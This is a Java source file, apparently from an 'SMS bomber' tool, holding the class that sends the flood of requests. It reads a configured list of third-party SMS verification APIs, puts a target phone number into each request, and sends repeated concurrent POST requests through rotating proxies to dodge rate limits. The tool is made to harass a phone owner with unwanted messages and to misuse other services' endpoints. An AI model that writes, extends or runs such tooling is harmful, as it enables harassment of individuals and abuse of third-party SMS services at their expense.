package ir.mrsf.smsbomber.utils;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonPrimitive;
import ir.mrsf.smsbomber.SMSBomber;
import ir.mrsf.smsbomber.enums.ContentType;
import ir.mrsf.smsbomber.models.API;
import lombok.experimental.UtilityClass;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.function.Consumer;

@UtilityClass
public class RequestUtil {
    private static final Gson gson;

    static {
        gson = new Gson();
    }

    public void sendSMSRequest(ExecutorService executor, String phone) {
        try {

            final List<API> apiList = SMSBomber.getSmsBomber().getConfigManager().getApiList();
            for (API api : apiList) {
                final Object payload = api.getPayload();
                ContentType contentType;
                String body;
                if (payload instanceof JsonObject payloadJson) {
                    body = gson.toJson(payloadJson, JsonObject.class);
                    contentType = ContentType.JSON;
                } else if (payload instanceof JsonPrimitive jsonPrimitive && jsonPrimitive.isString()) {
                    contentType = ContentType.www_form_urlencoded;
                    body = jsonPrimitive.getAsString();
                } else {
                    contentType = null;
                    body = null;
                }
                if (contentType == null) continue;
                if (body == null) continue;
                final String phoneNumber;
                if (api.isWithOutZero()) {
                    phoneNumber = api.getCountryCode() + phone.replaceFirst("^0+", "");
                } else {
                    phoneNumber = api.getCountryCode() + phone;
                }
                for (int i = 0; i < api.getRepeat(); i++) {
                    executor.submit(() -> {
                        smsRequest(api.getUrl().replaceAll("%phone%", phoneNumber), contentType,
                                body.replaceAll("%phone%", phoneNumber),
                                (integer) -> sendLog(api.getName(), integer)
                        );
                    });
                }
                Thread.sleep(100);
            }
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    private void sendLog(String name, int responseCode) {
        if (responseCode == HttpURLConnection.HTTP_OK) {
            System.out.println("Sent from: " + name);
        } else {
            System.out.println("Failed to send: " + name);
        }
    }

    private void smsRequest(String url, ContentType contentType, String body, Consumer<Integer> callback) {
        try {
            Thread.sleep(3000);
            byte[] postData = body.getBytes(StandardCharsets.UTF_8);
            final HttpURLConnection conn = getHttpURLConnectionSMS(url, contentType, postData);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(postData);
            }

            callback.accept(conn.getResponseCode());
        } catch (Exception e) {
            callback.accept(500);
        }
    }


    private HttpURLConnection getHttpURLConnectionSMS(String url, ContentType contentType, byte[] postData) throws IOException {
        final HttpURLConnection conn = (HttpURLConnection) new URL(url).
                openConnection(SMSBomber.getSmsBomber().getProxyManager().getNextProxy());
        conn.setDoOutput(true);
        conn.setInstanceFollowRedirects(false);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", contentType.getString());
        conn.setRequestProperty("charset", "utf-8");
        conn.setRequestProperty("Content-Length", Integer.toString(postData.length));
        conn.setUseCaches(false);
        return conn;
    }
}
